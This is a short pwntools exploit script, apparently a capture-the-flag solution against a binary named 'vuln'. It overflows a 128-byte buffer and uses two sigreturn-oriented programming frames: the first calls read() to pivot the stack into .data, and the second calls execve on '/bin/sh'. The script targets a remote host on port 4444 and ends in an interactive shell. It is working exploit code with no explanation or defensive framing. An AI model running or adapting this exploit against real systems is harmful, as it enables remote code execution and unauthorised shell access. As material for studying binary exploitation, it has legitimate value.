from pwn import *


context.clear(arch="amd64")
elf=ELF('./vuln')

payload = ""
payload += "A"*128
payload += p64(0x40102b) #rbp
payload += p64(0x0000000000401032)
payload += p64(15)
frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
frame.rax =  0 # SET RAX TO READ CALL
frame.rsi = 0x0000000000402000 # SET RSI TO .DATA
frame.rdi = 0 # SET RDI TO STDIN
frame.rdx = 500 #SET RDX TO SIZE
frame.rsp = 0x0000000000402000 #RSP TO STACK PIVOT
frame.rbp = 0x0000000000402000 #syscall .data
frame.rip = 0x0000000000401033  # SYSCALL LEAVE RET
payload += str(frame)

#p = process('./vuln')
p = remote("146.148.108.204",4444)
pause()
p.sendline(payload)


framee = SigreturnFrame(kernel="amd64") 
framee.rax =  59 
framee.rsi = 0x0 
framee.rdi = 0x0000000000402000 
framee.rdx = 0x0
framee.rsp = 0x0000000000402000
framee.rbp = 0x0000000000402000
framee.rip = 0x0000000000401033 
print len(framee)
p.sendline("/bin/sh\x00"+p64(0x0000000000401032) +p64(0xf) +str(framee)+"\x00"*(59-24-len(str(framee))))

p.interactive()
